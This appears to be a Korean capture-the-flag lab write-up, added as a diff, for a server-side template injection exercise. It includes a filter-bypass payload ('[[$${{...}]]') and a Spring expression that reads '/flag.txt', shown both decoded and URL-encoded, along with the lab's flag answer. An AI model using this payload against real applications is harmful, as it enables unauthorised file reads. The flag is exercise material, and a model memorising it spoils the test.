@@ -1,0 +1,30 @@
+==========================
+SSTI 3번
+==========================
+
+1. 공격 과정
+  1) 검색 기능에서 사용자의 검색어가 결과 화면에 반영되는 것을 확인
+  2) 검색어 파라미터 q에 SSTI 테스트 구문을 입력
+     [[${7*7}]]
+  3) 응답을 확인한 결과 ${ 부분이 제거되어 아래처럼 출력
+     입력값: [[${7*7}]]
+     출력값: [[7*7}]]
+  4) 이를 통해 검색어 필터가 ${ 문자열을 제거하는 방식으로 동작한다고 판단
+  5) 필터 우회를 위해 ${ 문자열이 제거된 뒤 다시 ${...} 형태가 남도록 중첩 구문을 사용
+     [[$${{7*7}]]
+  6) 결과 화면에서 49가 출력되는 것을 확인하여 필터 우회에 성공
+  7) [[$${{T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/flag.txt'))}]]
+
+2. 공격 URL, Parameter
+  공격 URL: https://lab.eqst.co.kr:8445/practice03/search
+  Parameter:  q
+
+3. 공격 구문
+  URL:  https://lab.eqst.co.kr:8445/practice03/search?q=%5B%5B%24%24%7B%7BT%28java.nio.file.Files%29.readString%28T%28java.nio.file.Paths%29.get%28%27%2Fflag.txt%27%29%29%7D%5D%5D
+  디코딩된 공격 구문:  [[$${{T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/flag.txt'))}]]
+ 
+4. 정답 
+FLAG{one_pass_filter_ssti_9f46074a}
+==========================
+
+* Blacklist Filtering -> 우회
